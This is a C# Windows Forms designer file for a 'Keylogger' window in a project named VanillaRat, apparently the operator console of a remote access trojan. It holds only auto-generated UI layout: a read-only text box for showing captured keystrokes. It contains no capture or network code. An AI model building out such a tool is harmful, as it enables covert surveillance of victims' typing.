namespace VanillaRat.Forms
{
    partial class Keylogger
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.txtKeylogger = new System.Windows.Forms.RichTextBox();
            this.SuspendLayout();
            // 
            // txtKeylogger
            // 
            this.txtKeylogger.BackColor = System.Drawing.SystemColors.Window;
            this.txtKeylogger.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.txtKeylogger.Dock = System.Windows.Forms.DockStyle.Fill;
            this.txtKeylogger.Location = new System.Drawing.Point(0, 0);
            this.txtKeylogger.Name = "txtKeylogger";
            this.txtKeylogger.ReadOnly = true;
            this.txtKeylogger.Size = new System.Drawing.Size(481, 264);
            this.txtKeylogger.TabIndex = 0;
            this.txtKeylogger.Text = "";
            // 
            // Keylogger
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.SystemColors.Window;
            this.ClientSize = new System.Drawing.Size(481, 264);
            this.Controls.Add(this.txtKeylogger);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.Name = "Keylogger";
            this.Text = "Keylogger";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Keylogger_FormClosing);
            this.ResumeLayout(false);

        }

        #endregion

        public System.Windows.Forms.RichTextBox txtKeylogger;
    }
}